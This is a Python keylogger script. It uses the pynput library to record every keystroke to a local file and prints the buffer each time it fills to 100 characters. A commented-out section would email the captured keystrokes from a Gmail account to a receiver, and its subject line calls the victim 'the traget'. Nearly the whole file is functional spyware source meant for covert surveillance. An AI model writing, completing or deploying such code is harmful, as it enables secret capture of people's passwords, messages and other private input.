import os
import smtplib
import pynput
from pynput.keyboard import Listener, Key


def on_press(key):
    with open("output.txt", 'a+') as f:
        if hasattr(key, 'char'):
            f.write(key.char)
        elif key == Key.space:
            f.write(' ')
        elif key == Key.enter:
            f.write('\n')
        elif key == Key.tab:
            f.write('\t')
        else:
            f.write('[' + key.name + ']')

    with open("output.txt", 'r+') as f:
        if len(f.read()) >= 100:
            send()
            f.truncate(0)


def send():
    with open("output.txt", "r") as f:
        print("-" * 100)
        print(f.read())
        print("-" * 100)

    # r = open("output.txt", "r")
    # EMAIL_ADDRESS = os.environ.get('EMAIL_USER')
    # with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
    #     smtp.ehlo()
    #     smtp.starttls()
    #     smtp.ehlo()
    #     smtp.login('sender_email@gmail.com', 'password')    # Specify sender email here
    #     subject = 'output from the traget !'
    #     body = r.read()
    #     msg = f'Subject: {subject} \n\n{body}'
    #     smtp.sendmail("sender_email@gmail.com", "reciever_email@gmail.com", msg)

    # end of sending section




def main(*args, **kwargs):
    with open("output.txt", "w+") as f:
        f.truncate(0)

    with Listener(on_press=on_press) as listener:
        listener.join()


if __name__ == "__main__":
    main()
